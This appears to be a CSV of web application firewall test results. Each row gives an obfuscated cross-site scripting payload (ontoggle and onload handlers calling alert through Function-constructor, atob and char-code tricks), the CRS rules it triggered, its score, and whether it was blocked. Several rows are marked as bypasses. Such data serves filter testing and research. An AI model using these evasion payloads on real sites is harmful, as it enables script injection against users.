index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
1854,"<details open ontoggle=""(function(){with(this){this[atob('Y29uc3RydWN0b3I=')][atob('Y29uc3RydWN0b3I=')]('al'+'ert(1)')()}})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o103,22v217,127t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,127 || o25,11v217,127t:urlDecodeUni || v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,36v217,127t:urlDecodeUni,t:compressWhitespace || ",30,178032496247.941902
1863,"<details open ontoggle=""(window['constructor']['constructor']('ale'+'rt(2)'))()"">",0,1,block,5,"933210,941100,941120,941370,949110","o24,55v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,21v217,81t:urlDecodeUni,t:compressWhitespace || ",20,178032497739.825481
1871,"<details open ontoggle=""(new(Object['getPrototypeOf'](async function(){})['constructor'])('ale'+'rt(7)'))()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,83v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o60,11v217,109 || o60,11v217,109t:urlDecodeUni || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178032499164.460233
1872,"<details open ontoggle=""[]['constructor']['constructor']('ale'+'rt(7)')()"">",0,1,block,4,"933210,941100,941120,949110","o24,49v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178032499212.600561
1873,"<details open ontoggle=""(async function(){})['constructor']('ale'+'rt(7)')()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,52v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o31,11v217,78 || o31,11v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178032499442.182644
1874,"<details open ontoggle=""[]['const'+'ructor']['const'+'ructor']('wind'+'ow.ale'+'rt(3)')()"">",0,1,block,4,"933210,941100,941120,949110","o24,65v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178032499529.650745
1886,"<details open ontoggle=""[]['const'+'ructor']['const'+'ructor']('ale'+'rt(3)')()"">",0,1,block,4,"933210,941100,941120,949110","o24,55v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17803250161.196267
1895,"<details open ontoggle=""(Reflect.get(async function(){}[String.fromCharCode(95,95,112,114,111,116,111,95,95)],String.fromCharCode(99,111,110,115,116,114,117,99,116,111,114))('al'+'ert(1)')())""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o173,18v217,203t:urlDecode,t:replaceComments,t:compressWhitespace || o43,11v217,203 || o43,11v217,203t:urlDecodeUni || v217,203t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,203t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178032503298.272036
1910,"<details open ontoggle=""top['Function']('return\x20al\u0065rt')()(2)"">",0,1,block,5,"933210,941100,941120,941370,949110","o27,41v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,70t:urlDecodeUni,t:compressWhitespace || ",20,178032505838.912414
1926,"<details open ontoggle=""(self['Function']['constructor']('return wind'+'ow'))()['al'+'ert']('XSS')"">",0,1,block,5,"933210,941100,941120,941370,949110","o24,74v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,16v217,100t:urlDecodeUni,t:compressWhitespace || ",20,178032508526.833508
1930,"<details open ontoggle=""(function(){return globalThis['Function']['constructor']})()('wind'+'ow.al'+'ert(1)')()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,87v217,113t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,113 || o25,11v217,113t:urlDecodeUni || v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178032509263.523244
1932,"<details open ontoggle=""(function(){return this['Func'+'tion']['constr'+'uctor']})()('wind'+'ow.al'+'ert(1)')()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,87v217,113t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,113 || o25,11v217,113t:urlDecodeUni || v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o43,19v217,113t:urlDecodeUni,t:compressWhitespace || ",30,178032509535.866968
1935,"<details open ontoggle=""(self.Function.constructor(String.fromCharCode(119,105,110,100,111,119,46,97,108,101,114,116,96,49,96)))()"">",0,1,block,4,"934100,941100,941120,949110","o51,19v217,132 || v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17803251003.432958
1936,"<details open ontoggle=""(self.Function.constructor('wind\u006Fw.al\u0065rt`1`'))()"">",0,1,bypass,2,"941100,941120","v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,178032510278.901282
1941,"<details open ontoggle=""(function(){return(this[atob('RnVuY3Rpb24=')][atob('Y29uc3RydWN0b3I=')]('return thi'+'s.al'+'ert'))()})()('XSS')"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o95,41v217,138t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,138 || o25,11v217,138t:urlDecodeUni || v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o43,26v217,138t:urlDecodeUni,t:compressWhitespace || ",30,17803251103.465341
1944,"<details open ontoggle=""(function(){var a=this,b='Function',c='constructor';return(a[b][c]('return thi'+'s.al'+'ert'))()})()('XSS')"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o82,49v217,133t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,133 || o25,11v217,133t:urlDecodeUni || v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178032511617.241759
1954,"<details open ontoggle=""(globalThis['Function']['fromCharCode']||globalThis['Function']['constructor'])('a'+'lert(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o75,45v217,122t:urlDecode,t:replaceComments,t:compressWhitespace || v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17803251322.117517
1985,"<details open ontoggle=""top['Function']('aler'+'t(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o27,29v217,58t:urlDecode,t:replaceComments,t:compressWhitespace || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,58t:urlDecodeUni,t:compressWhitespace || ",20,178032518669.477920
1988,"<details open ontoggle=""(function(){return top['Function']['prototype']['constructor']})()('al'+'ert(1)')()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,83v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,109 || o25,11v217,109t:urlDecodeUni || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o43,15v217,109t:urlDecodeUni,t:compressWhitespace || ",30,178032519134.510988
1994,"<details open ontoggle=""top['Function']['prototype']['constructor'](unescape('%61%6c%65%72%74%28%31%29'))()"">",0,1,block,5,"933210,941100,941120,941370,949110","o27,64v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,109t:urlDecodeUni,t:compressWhitespace || ",20,178032520290.824856
1998,<svg><animate attributeName=href values=1 onbegin=window['Function']['constructor']('return'+unescape('%20alert'))()(1) />,0,1,block,6,"933210,941100,941120,941160,941370,949110","o56,61v217,122t:urlDecode,t:replaceComments,t:compressWhitespace || v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,9v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,50v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o50,18v217,122t:urlDecodeUni,t:compressWhitespace || ",25,178032520870.327144
1999,"<details open ontoggle=""(Reflect.construct(class{static{(()=>Function('ale'+'rt(1)')())()}},[]));void(0)"">",0,1,block,4,"933210,941100,941120,949110","o69,35v217,106t:urlDecode,t:replaceComments,t:compressWhitespace || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178032521054.202037
2007,"<details open ontoggle=""with(top)Function(atob('YWxlcnQoMSk='))()"">",0,1,bypass,2,"941100,941120","v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,178032522313.660057
2032,"<details open ontoggle=""[]['constructor']['constructor']('\u0061lert(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,51v217,87t:urlDecode,t:replaceComments,t:compressWhitespace || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178032526510.245840
2034,"<details open ontoggle=""[].sort['constructor']['constructor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,54v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178032526842.046692
2046,"<details open ontoggle=""(function(){})['const\u0072uctor']('\u0061lert(1)')()""></details>",0,1,block,4,"934100,941100,941120,949110","o25,11v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178032528823.262079
2057,"<details open ontoggle=""(new/**/Function(['ale','rt(1)'].join``))()""></details>",0,1,bypass,2,"941100,941120","v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17803253086.415422
2058,"<details open ontoggle=""(new/**/Function(atob('YWxlcnQoMSk=')))()""></details>",0,1,bypass,2,"941100,941120","v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,178032531042.879340
2059,"<details open ontoggle=""window['Function'](['al'+'ert(1)'].join``)()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o30,38v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v217,80t:urlDecodeUni,t:compressWhitespace || ",20,178032531163.844549
2069,"<details open ontoggle=""this['const'+'ructor']['const'+'ructor']('ale'+'rt(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o28,53v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,22v217,93t:urlDecodeUni,t:compressWhitespace || ",20,178032532937.917324
2077,"<details open ontoggle=""Object['getPrototypeOf'](async function(){})['constructor']('ale'+'rt(1)')()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o30,70v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || o55,11v217,102 || o55,11v217,102t:urlDecodeUni || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178032534369.596312
2078,"<details open ontoggle=""(function(){return(window)})()['\x65val']['\x63all'](null,atob('YWxlcnQoMSk='))"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o24,79v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o43,22v217,105t:urlDecodeUni,t:compressWhitespace || ",25,178032534580.680978
2079,"<details open ontoggle=""(function(){return this})()['ev\u0061l']['c\u0061ll'](null,atob('YWxlcnQoMSk='))"">",0,1,block,5,"933210,934100,941100,941120,949110","o24,80v217,106t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,106 || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178032534664.850430
2081,"<details open ontoggle=""(function(){return(self)})()[String.fromCharCode(101,118,97,108)][String.fromCharCode(99,97,108,108)](null,atob('YWxlcnQoMSk='))"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o24,128v217,154t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,154 || v217,154t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,154t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o43,46v217,154t:urlDecodeUni,t:compressWhitespace || ",25,178032535097.246792
2085,"<svg onload=""window['Function']('ale'+'rt(1)')()""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o19,29v217,56t:urlDecode,t:replaceComments,t:compressWhitespace || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,18v217,56t:urlDecodeUni,t:compressWhitespace || ",25,178032535764.085730
2095,"<details open ontoggle=""(function(){}.constructor.bind()(String.fromCharCode(97,108,101,114,116,40,49,41))())""></details>",0,1,block,5,"933210,934100,941100,941120,949110","o24,85v217,121t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,121 || v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17803253746.049895
2110,"<details open ontoggle=""with(window)Function('al'+'ert(1)')()"">",0,1,bypass,2,"941100,941120","v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,178032539920.262889
2124,"<details open ontoggle=""[]['filte'+'r']['constr'+'uctor']['constr'+'uctor']('a'+'lert'+'(15)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,72v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178032542343.167828
2128,"<details open ontoggle=""parent['Function']['call'](null,String.fromCharCode(97,108,101,114,116,40,49,53,41))()""></details>",0,1,block,5,"933210,934100,941100,941120,949110","o30,80v217,122t:urlDecode,t:replaceComments,t:compressWhitespace || o56,19v217,122 || v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178032543096.136211
2131,"<details open ontoggle=""parent.constructor.constructor('parent.Function.call(null,`al`+`ert(15)`)()').call()""></details>",0,1,bypass,2,"941100,941120","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,178032543526.871421
2139,"<details open ontoggle=""self['Function']`${[][String.fromCharCode(102,105,110,100)][String.fromCharCode(99,111,110,115,116,114,117,99,116,111,114)]('al'+'ert(15)')()}`""></details>",0,1,block,7,"932130,934100,934100,941100,941120,941370,949110","o38,121v217,179t:urlDecodeUni,t:cmdLine || o46,19v217,179 || o46,19v217,179t:urlDecodeUni || v217,179t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,179t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v217,179t:urlDecodeUni,t:compressWhitespace || ",30,178032544990.520683
2140,"<details open ontoggle=""globalThis['Function']['call'](null,atob('YWxlcnQoMTUp'))()""></details>",0,1,block,4,"933210,941100,941120,949110","o34,49v217,95t:urlDecode,t:replaceComments,t:compressWhitespace || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178032545087.799361
2143,"<details open ontoggLE=""globalThis.Function.call(null,String.fromCharCode(97,108,101,114,116,40,49,53,41))()""></details>",0,1,block,4,"934100,941100,941120,949110","o54,19v217,120 || v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178032545565.405380
2149,"<details open ontoggle=""Function?.['con\x73tructor']('\u0061lert(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,178032546596.827035
2154,"<details open ontoggle=""(window['Function']||{})['constructor']('return top')()['Function']('ale'+'rt(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o48,60v217,120t:urlDecode,t:replaceComments,t:compressWhitespace || v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,18v217,120t:urlDecodeUni,t:compressWhitespace || ",20,178032547326.908856
2164,"<details open ontoggle=""1..__proto__['constructor']['constructor']('al\u0065rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o36,49v217,97t:urlDecode,t:replaceComments,t:compressWhitespace || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178032549177.974831
2169,"<svg onload=""(globalThis['Function'])('retur'+'n\u0020aler'+'t')()(1)"">",0,1,block,5,"933210,941100,941120,941160,949110","o13,56v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178032549990.955117
2170,"<svg onload=""(top['Function'])('retur'+'n\u0020aler'+'t')()(1)"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o13,49v217,64t:urlDecode,t:replaceComments,t:compressWhitespace || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,15v217,64t:urlDecodeUni,t:compressWhitespace || ",25,17803255015.513790
2171,"<svg onload=""(parent['Function'])('retur'+'n\u0020aler'+'t')()(1)"">",0,1,block,5,"933210,941100,941120,941160,949110","o13,52v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178032550394.831782
2175,"<details open ontoggle=""(()=>{with(this)with(constructor)return constructor})()('ale'+'rt(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o34,62v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178032551029.489564
2188,"<details open onTOGGLE=""(()=>{return(function(){}.constructor.constructor(atob('YWxlcnQoOCk='))())})()""></details>",0,1,block,4,"934100,941100,941120,949110","o37,11v217,114 || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178032553315.277328
